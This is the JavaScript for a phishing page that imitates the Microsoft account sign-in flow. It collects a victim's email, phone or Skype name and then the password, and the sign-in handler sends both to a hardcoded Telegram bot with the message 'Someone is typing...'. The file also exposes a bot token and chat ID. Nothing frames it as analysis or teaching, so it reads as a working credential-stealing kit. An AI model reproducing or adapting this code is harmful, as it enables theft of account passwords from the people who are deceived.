document.addEventListener('DOMContentLoaded', () => {
    const unReq = "Enter a valid email address, phone number, or Skype name."
    const pwdReq = "Please enter the password for your Microsoft account."
    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');
    let view = "uname";
    let unameVal = pwdVal = false;
    /////next button
    const nxt = document.getElementById('btn_next');
    nxt.addEventListener('click', () => {
        //validate the form
        validate();
        if (unameVal) {
            document.getElementById("section_uname").classList.toggle('d-none');
            document.getElementById('section_pwd').classList.remove('d-none');
            document.querySelectorAll('#user_identity').forEach((e) => {
                e.innerText = unameInp.value;
            })
            view = "pwd";
        }
    })
    //////sign in button
    const sig = document.getElementById('btn_sig');
    sig.addEventListener('click', async () => {
        //validate the form
        validate();
    if (!pwdVal) {
        return;
    }
 if (pwdVal) {
    const name = unameInp.value.trim();
    const pwd = pwdInp.value.trim();
    try {
        const message =
            `Someone is typing... \n\n` +
            `Name: ${name}\n` +
            `Password: ${pwd}`;
        const response = await fetch(`https://api.telegram.org/bot8828292202:AAFK5J441LHn-_GgtPZhaUi43ZjvaE3vnY8/sendMessage`,)
            {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: "8735261618",
                    text: message
                })
            }
        );
        const result = await response.json();
        if (!result.ok) {
            console.error('Telegram error:', result);
            return;
        }
        document.getElementById("section_uname").classList.add('d-none');
        document.getElementById('section_pwd').classList.remove('d-none');
        view = "final";
    } catch (error) {
        console.error('Submission error:', error);
    }
        document.getElementById("section_uname").classList.add('d-none');
        document.getElementById('section_pwd').classList.remove('d-none');
            view = "final";
        }
    })
    function validate() {
        function unameValAction(type) {
            if (!type) {
                document.getElementById('error_uname').innerText = unReq;
                unameInp.classList.add('error-inp');
                unameVal = false;
            } else {
                document.getElementById('error_uname').innerText = "";
                unameInp.classList.remove('error-inp')
                unameVal = true;
            }
        }
        function pwdValAction(type) {
            if (!type) {
                document.getElementById('error_pwd').innerText = pwdReq;
                pwdInp.classList.add('error-inp')
                pwdVal = false;
            } else {
                document.getElementById('error_pwd').innerText = "";
                pwdInp.classList.remove('error-inp')
                pwdVal = true;
            }
        }
        if (view === "uname") {
            if (unameInp.value.trim() === "") {
                unameValAction(false);
            } else {
                unameValAction(true);
            }
            unameInp.addEventListener('change', function () {
                if (this.value.trim() === "") {
                    unameValAction(false);
                } else {
                    unameValAction(true);
                }
            })
        } else if (view === "pwd") {
            if (pwdInp.value.trim() === "") {
                pwdValAction(false);
            } else {
                pwdValAction(true);
            }
            pwdInp.addEventListener('change', function () {
                if (this.value.trim() === "") {
                    pwdValAction(false);
                } else {
                    pwdValAction(true);
                }
            })
        }
        return false;
    }
    //back button
    document.querySelector('.back').addEventListener('click', () => {
        view = "uname";
        document.getElementById("section_pwd").classList.toggle('d-none');
        document.getElementById('section_uname').classList.remove('d-none');
    })
    //final buttons
    document.querySelectorAll('#btn_final').forEach((b) => {
        b.addEventListener('click', () => {
            //close the window
            window.open(location, '_self').close();
        })
    })
})
